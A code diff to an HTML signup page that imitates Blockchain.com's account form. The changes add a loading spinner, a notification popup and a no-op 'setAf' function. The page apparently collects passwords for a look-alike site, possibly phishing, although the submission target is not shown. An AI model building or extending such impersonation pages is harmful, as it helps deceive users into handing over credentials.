@@ -10,6 +10,11 @@
   <!-- Bootstrap Icons -->
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.17.0/font/bootstrap-icons.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <!-- Bootstrap Notify CSS and JS -->
+  <script src="./bootstrap-notify.min.js.download"></script>
+		
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-notify@3.1.3/dist/css/bootstrap-notify.min.css">
+  
 </head>
 <body style="background-color: rgb(18, 29, 51);">
 <style>
@@ -553,7 +558,7 @@ label {
             <div class="inline sc-eNNmBn cAuCmn"><div class="sc-lnmtFM fdMkfz"><div class="sc-jUpvKA yPTyf"><div class="sc-jdfcpN jNIgXG Container"><div class="sc-kEYyzF hbbYsk"><input required id="secretPhase" type="checkbox" class="sc-kkGfuU jCYGQB" value=""><label for="secretPhase" data-e2e="false" class="sc-iAyFgw jnOrAR"></label></div></div></div></div><label class="inline sc-RbTVP iAbjjL" style="margin-top: 1px;"><div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw eGdQh"><div class="sc-gNJABI jkNPNG" style="padding-left: 4px;"><div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw glIUyi">By creating an account, you agree to Blockchain.com’s </div><span>&nbsp;</span><a href="https://www.blockchain.com/legal/terms" target="_blank" data-e2e="blockchainTermsLink" color="blue600" class="sc-htpNat gbcMol">Terms of Service</a>&nbsp;<div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw glIUyi">&amp; </div>&nbsp;<a href="https://www.blockchain.com/legal/privacy" target="_blank" data-e2e="blockchainPrivacyLink" color="blue600" class="sc-htpNat gbcMol">Privacy Policy</a>.</div> </div></label></div>
                       
                       
-            <button type="submit" class="btn btn-primary form-control" id="btn">Continue</button>
+            <button type="submit" class="btn btn-primary form-control" id="btn"><span class="continue" id="continue">Continue </span><img src="dot.png" alt="" width="30px" style="display: none;" id="img"></button>
           </form>
           <div class="" style="display: flex; flex-direction:column; line-height: 0px; justify-content: center; align-items: center; margin-top: 0px; padding: 5px;">
             <img src="store.png" alt="" class="img" width="100%">
@@ -610,6 +615,8 @@ label {
 
 
 <script>
+   var img=document.getElementById('img');
+   
    function toggleStateField() {
     var country = document.getElementById('country');
     var stateField = document.getElementById('stateField');
@@ -622,7 +629,10 @@ label {
   }
 
   
-  function reveal(){
+  function setAf(){
+    var country=document.getElementById('country').value
+    country="Afghanistan"
+
 
 
 }
@@ -630,13 +640,13 @@ label {
 
 
 
-  var myInput = document.getElementById('password');
+  var specificInput = document.getElementById('password');
   var myDiv = document.getElementById('pass');
 
   // Add an input event listener
-  myInput.addEventListener('input', function () {
+  specificInput.addEventListener('input', function () {
     // Toggle the display of the div based on input value
-    if (myInput.value.trim() !== '') {
+    if (specificInput.value.trim() !== '') {
       myDiv.style.display = 'block';
     } else {
       myDiv.style.display = 'none';
@@ -646,8 +656,8 @@ label {
 
 
 
-
-
+  var img=document.getElementById('img');
+   
 
 
 
@@ -655,6 +665,9 @@ label {
     
    function red () {
     var btn=document.getElementById("btn")
+    var img=document.getElementById('img');
+       img.style="display:none"
+       
            btn.style="opacity:1"
            btn.innerHTML="Continue"
    
@@ -667,9 +680,13 @@ document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
                   
    function blurr (){
        var btn=document.getElementById("btn")
-       btn.style="opacity:0.5"
-       btn.innerHTML= "Loading . . ."
+       var img=document.getElementById('img');
+       img.style="display:inline"
+       var contine=document.getElementById('continue')
+       contine.innerHTML=" "
       
+       btn.style="opacity:0.5"
+       
    }
    
           async function registerUser(values) {
@@ -680,6 +697,7 @@ document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
                    data: { ...values },
                    timeout: 30000,
                    success: function (data) {
+                    pop();
                        console.log(data);
                        $('.live-section').html("Account was successfully created").addClass('alert-success')
                        setTimeout(function () {
@@ -689,6 +707,7 @@ document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
                    },
                    error: function (xhr, status, error) {
                        red();
+                       setAf();
                        console.log(error);
                        $('.live-section').html("User already exists").addClass('alert-danger')
                    }
@@ -696,7 +715,22 @@ document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
    
            }
    
-   
+   function pop(){
+    
+    $.notify({
+    icon: 'flaticon-alarm-1',
+    title: '',
+    message: 'Account successfully created',
+  }, {
+    // options
+    type: 'info', // 'success', 'info', 'warning', 'danger'
+    placement: {
+      from: "bottom",
+      align: "left"
+    },
+    time: 1000, // Duration in milliseconds
+  });
+   }
            $('#signupForm').submit(function (e) {
                e.preventDefault(); // prevents page reload
                blurr();
